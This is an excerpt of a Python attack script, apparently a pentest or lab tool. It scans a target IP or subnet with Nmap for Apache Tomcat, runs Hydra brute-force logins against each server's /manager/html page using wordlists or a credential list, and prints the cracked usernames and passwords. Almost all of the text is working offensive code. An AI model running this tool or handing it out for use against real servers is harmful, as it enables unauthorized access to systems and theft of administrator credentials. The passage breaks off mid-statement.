...
def run_nmap_scan(target):
    """Run targeted Nmap scan for Tomcat ports and extract IPs."""
    ports = ["80", "8080", "8443"]
    ...
    try:
        ...
        # Parse Nmap output for Tomcat services
        tomcat_servers = []
        current_ip = None
        ...
        for line in result.stdout.splitlines():
            ...
            elif "open" in line and "tomcat" in line.lower() and current_ip:
                port = line.split("/")[0].strip()
                print_status(f"Found Apache Tomcat on {current_ip}:{port}", stage="nmap")
                tomcat_servers.append((current_ip, port))
        if not tomcat_servers:
            print_status("No Tomcat services found.", stage="nmap")
        return tomcat_servers
    except subprocess.CalledProcessError as e:
        print_status(f"ERROR: Nmap scan failed: {e}", stage="error")
        return []

def run_hydra(ip, port, username_wordlist, password_wordlist, credential_list, protocol):
    """Run Hydra to crack credentials on /manager/html for a specific IP."""
    effective_protocol = protocol if protocol else ("https" if port == "8443" else "http")
    url = f"{effective_protocol}://{ip}:{port}/manager/html"
    ...
    if credential_list:
        ...
        hydra_cmd = (
            f"hydra -C \"{credential_list}\" -vV -t 4 -f {ip} {service}"
            f" {login_path} -s {port}"
        )
    else:
        ...
        hydra_cmd = (
            f"hydra -L \"{username_wordlist}\" -P \"{password_wordlist}\" -vV -t 4 -f {ip} {service}"
            f" {login_path} -s {port}"
        )
...
def main():
    ...
    parser.add_argument("target", help="Target IP address or subnet (e.g., 192.168.56.0/24)")
    ...
    # Step 1: Nmap scan
    tomcat_servers = run_nmap_scan(args.target)
    if not tomcat_servers:
        print_status("No Tomcat services found. Exiting.", stage="error")
        exit(1)

    # Step 2: Run Hydra on each Tomcat server
    all_credentials = []
    for ip, port in tomcat_servers:
        credentials = run_hydra(ip, port, args.username_wordlist, args.password_wordlist, args.credential_list, args.protocol)
        if credentials:
            all_credentials.extend(credentials)

    # Display all cracked credentials at the end with IPs
    if all_credentials:
        print_status("Final Cracked Credentials:", stage="credentials")
        for ip, username, password in all_credentials:
            # Use bold green for username and password, default color for the rest
            message = f"IP: {ip}, Username: \033[1;92m{username}\033[0m, Password: \033[1;92m{password}\033[0m"
            print_status(message, stage="general")  # Use general stage to avoid overriding ANSI codes
    else:
